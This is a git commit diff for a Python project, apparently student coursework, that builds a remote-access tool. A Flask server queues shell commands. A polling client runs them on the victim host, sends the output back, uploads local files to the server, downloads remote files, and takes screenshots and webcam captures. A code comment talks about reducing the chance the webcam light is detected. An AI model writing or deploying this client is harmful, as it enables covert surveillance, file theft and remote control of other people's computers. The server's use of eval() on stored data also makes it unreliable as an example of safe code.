81ff7ed65e066c609046d3b90be2804d3462b41e
lyl <446397661@qq.com>
2021-12-11 23:05:44 +0800

    Version1

--- G11RC/app.py
+++ G11RC/app.py
@@ -1,39 +1,116 @@
+from time import sleep
 from urllib import parse
-
-from flask import Flask, render_template
+from flask_cors import CORS, cross_origin
+from flask import Flask, render_template, make_response, jsonify
 from flask import request
 import urllib.parse
 
 app = Flask(__name__)
 
 
-@app.route('/')
-def hello_world():
-    return 'Hello World!'
-
 
 @app.route('/lzl/')
 def test():
-    return 'fuck!'
+    return 'demo!'
 
 @app.route('/test/')
 @app.route('/test/<name>')
 def show_template(name=None):
+    #info = request.json
     return render_template('test.html', name=name)
 
 
 @app.route('/hello', methods=['POST'])
+@cross_origin()
 def send_commands():
     info = request.json
-    command = input("input command:")
+    #print(info)
+    #command = info["command"]
+
+    f = open('F:\\current_semester\\software_security\\shell\\remote-shell\\G11RC\\test.txt')
+    command = f.read()
+    f.close()
     return command
 
 
-@app.route('/report', methods=['POST'])
-def print_output():
+@app.route('/fronttest', methods=['POST'])
+@cross_origin()
+def handle_req():
+    if request.method == 'POST':
+        info = request.json
+        command = info["command"]
+        f = open('F:\\current_semester\\software_security\\shell\\remote-shell\\G11RC\\test.txt', 'w+')
+        f.write(command)
+    return "200"
 
-    print(urllib.parse.unquote(str(request.get_data())).replace('+', ' '))
-    return "valid"
+
+@app.route('/report', methods=['POST', 'GET'])
+def store_output():
+    command = request.json['cmd']
+    print(command)
+    command_output = urllib.parse.unquote(str(request.json['output'])).replace('+', ' ')
+    if command == 'dir':
+        print("dir!")
+        file_info = {}
+        file_entries = []
+        command_output = urllib.parse.unquote(str(request.json['output'])).replace('+', ' ')
+        print(command_output)
+        sections = command_output.split('\n')
+        file_info['path'] = sections[3]
+        sections = sections[5:-3]
+        for section in sections:
+            print(section)
+            tmp = section.split(' ')
+            while '' in tmp:
+                tmp.remove('')
+            file_entry = {'LastWriteDate': tmp[0], 'LastWriteTime': tmp[1]}
+            if tmp[2] == '<DIR>':
+                file_entry.update({'Type': tmp[2], 'Length': '', 'Name': tmp[3]})
+            else:
+                file_entry.update({'Type': '<FILE>', 'Length': tmp[2], 'Name': tmp[3]})
+            file_entries.append(file_entry)
+        file_info['files'] = file_entries
+        print("write dir success")
+        f = open('F:\\current_semester\\software_security\\shell\\remote-shell\\G11RC\\buffers\\dir_buffer.txt', 'w+')
+        f.write(str(file_info))
+        f.close()
+    else:
+        f = open('F:\\current_semester\\software_security\\shell\\remote-shell\\G11RC\\buffers\\output.txt', 'a')
+        f.write(command_output)
+        f.close()
+    return ""
+
+
+@cross_origin()
+@app.route('/upload', methods=['POST'])
+def upload_handler():
+    f = request.files['uploaded']
+    print(f.filename)
+    path = 'F:\\current_semester\\software_security\\shell\\remote-shell\\G11RC\\download\\' + f.filename
+    f.save(path)
+    return ""
+
+
+@app.route('/index', methods=['POST', 'GET'])
+def console_output():
+    f_command_output =  open('F:\\current_semester\\software_security\\shell\\remote-shell\\G11RC\\buffers\\output.txt', 'r')
+
+    command_output = f_command_output.read()
+    f_command_output.close()
+
+    f_dir_output = open('F:\\current_semester\\software_security\\shell\\remote-shell\\G11RC\\buffers\\dir_buffer.txt', 'r')
+    file_info = f_dir_output.read()
+    if file_info != '':
+        file_entries = eval(file_info)
+
+    file_entries = file_info['files']
+    print()
+    print(file_entries)
+    f_dir_output.close()
+
+    return render_template('test.html', file_entries=file_entries, command_output=command_output)
+
+
 
 
 if __name__ == '__main__':
--- G11RC/client.py
+++ G11RC/client.py
@@ -38,16 +38,16 @@ class Client(object):
         """ Ask server for instructions """
         req = requests.post(config.SERVER + '/hello',
                             json={'platform': self.platform, 'hostname': self.hostname})
-        print(req.text)
+        #print(req.text)
         return req.text
 
-    def send_output(self, output, newlines=True):
+    def send_output(self, output, command='', newlines=True):
         """ Send console output to server """
         if not isinstance(output, str):
             output = output.decode("gb18030")
-            print(output)
+            #print(output)
         req = requests.post(config.SERVER + '/report',
-                            data={'output': output})
+                            json={'output': output, 'cmd': command})
 
     def runcmd(self, cmd):
         """ Runs a shell command and returns its output """
@@ -57,17 +57,90 @@ class Client(object):
             out, err = proc.communicate()
             output = (out + err)
             #print(output)
-            self.send_output(output)
+            self.send_output(output, cmd)
         except Exception as exc:
             self.send_output(traceback.format_exc())
+
+
+    def expand_path(self, path):
+        """ Expand environment variables and metacharacters in a path """
+        return os.path.expandvars(os.path.expanduser(path))
+
+
+    def upload(self, file):
+        """ Uploads a local file to the server """
+        print("file entity path:" + file)
+        try:
+            if os.path.exists(file) and os.path.isfile(file):
+                self.send_output("[*] Uploading %s..." % file)
+                requests.post(config.SERVER + '/upload',
+                              files={'uploaded': open(file, 'rb')})
+            else:
+                pass
+                self.send_output('[!] No such file: ' + file)
+        except Exception as exc:
+            print(traceback.format_exc())
+
+    def download(self, file, destination):
+        """ Downloads a file the the agent host through HTTP(S) """
+        try:
+           # destination = self.expand_path(destination)
+            self.send_output("[*] Downloading %s..." % file)
+            req = requests.get(file, stream=True)
+            print(file)
+            print(destination)
+            tmp = file[8:].split('/')
+            print(tmp)
+            destination += '\\' + tmp[-1]
+            print(destination)
+            with open(destination, 'wb') as f:
+                for chunk in req.iter_content(chunk_size=8000):
+                    if chunk:
+                        f.write(chunk)
+            self.send_output("[+] File downloaded: " + destination)
+        except Exception as exc:
+            print(traceback.format_exc())
+            self.send_output(traceback.format_exc())
+
+    def screenshot(self):
+        """ Takes a screenshot and uploads it to the server"""
+        tmp_file = tempfile.NamedTemporaryFile()
+        screenshot_file = tmp_file.name + ".png"
+
+        if os.name != 'posix':
+            screenshot = ImageGrab.grab()
+            tmp_file.close()
+            screenshot.save(screenshot_file)
+        else:
+            name = tmp_file.name + ".png"
+            os.system("screencapture %s" % name)
+
+        self.upload(screenshot_file)
+
+
+    def camshot(self):
+        # Notice: light of usage webcam gets turned on.
+        # TODO: Find way to disable led-lamp or reduce amount of time.sleep as much as possible for less detection
+        cam = cv2.VideoCapture(0)
+        time.sleep(3)  # wait for camera to open up, so image isn't dark (less sleeping = darker image)
+        ret, frame = cam.read()
+        if not ret:
+            return
+        tmp_file = tempfile.NamedTemporaryFile()
+        camshot_file = tmp_file.name + ".png"
+        tmp_file.close()
+        cv2.imwrite(camshot_file, frame)
+        self.upload(camshot_file)
 
     def run(self):
         """ Main loop """
         while True:
             try:
+                time.sleep(1)
                 todo = self.server_hello()
                 # Something to do ?
-                if todo:
+                if todo != "":
+                    print(todo)
                     commandline = todo
                     self.send_output('$ ' + commandline)
                     split_cmd = commandline.split(" ")
@@ -75,20 +148,32 @@ class Client(object):
                     args = []
                     if len(split_cmd) > 1:
                         args = split_cmd[1:]
-                    try:
+
+                    if command == 'upload':
+                        self.upload(args[0])
+                    elif command == 'download':
+                        self.download(args[0], args[1])
+                    elif command == 'screenshot':
+                        self.screenshot()
+                    elif command == 'camshot':
+                        self.camshot()
+                    else:
                         self.runcmd(commandline)
-                    except Exception as exc:
-                        self.send_output(traceback.format_exc())
+                    f = open('F:\\current_semester\\software_security\\shell\\remote-shell\\G11RC\\test.txt', 'w+')
+                    f.write("")
                 else:
-                    print("对服务端say hello了它没听到")
+                    pass
             except Exception as exc:
                 print("command exec error")
 
+    def test(self):
+        req = requests.post(config.SERVER + '/test/',
+                            json={'name': 'lzl', 'number':'0017'})
+        return req
 
 def main():
     agent = Client()
-    command = agent.server_hello()
-    agent.runcmd(command)
+    agent.run()
 
 
 if __name__ == "__main__":
